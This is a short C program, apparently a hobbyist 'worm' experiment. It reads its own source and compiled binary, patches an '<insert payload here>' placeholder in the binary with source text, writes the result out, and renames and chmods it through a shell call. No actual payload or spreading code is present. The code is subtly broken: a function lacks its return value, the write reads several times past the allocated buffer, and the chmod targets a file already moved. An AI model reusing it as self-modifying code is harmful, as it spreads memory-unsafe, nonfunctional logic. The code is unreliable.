#include <stdio.h>
#include <stdlib.h>

int NUM_CHARS = 5000;
static char a[100] = "hello <insert name here>";
static char target[2000] = "<insert payload here>";


	
char * read_source(char *filename) {
	char *buffer =  malloc(sizeof(char) * NUM_CHARS);
	FILE *op; 
	op = fopen(filename,"r");
	fread(buffer,sizeof(char), sizeof(char) * NUM_CHARS,op);
	fclose(op);
	return buffer;
}

char * read_binary(char *filename) {
	char *buffer =  malloc(sizeof(char) * NUM_CHARS);
	FILE *op; 
	op = fopen(filename,"rb");
	fread(buffer,sizeof(char), sizeof(char)* NUM_CHARS,op);
	fclose(op);
	printf("Hello %s\n",buffer);
	return buffer;
}


char * fiddle(char *source, char *binary) {
	int i;
	int j;

	for(i= 0; i< NUM_CHARS; i++) {
		// loop until insert  is found 
		if(binary[i] == '<' && binary[i+1]=='i' && binary[i+2] == 'n') {
			//printf("Found Payload \n");

			for(j = 0; j <100; j++) {
				
				if(source[j] == '\x00'){
					break;
				}
				binary[i+j] =  source[j];
			}

			break;

		}
	}

}


int main(){ 
	char *source = read_source("worm.c");
	char *binary = read_binary("worm");

	fiddle(source,binary);


	FILE *op = fopen("wormy","wb");
	fwrite(binary,sizeof(char), sizeof(binary)*NUM_CHARS,op);
	fclose(op);
	system("mv wormy worm; chmod +x wormy");
	

	free(source);
	free(binary);
	return 0;

}

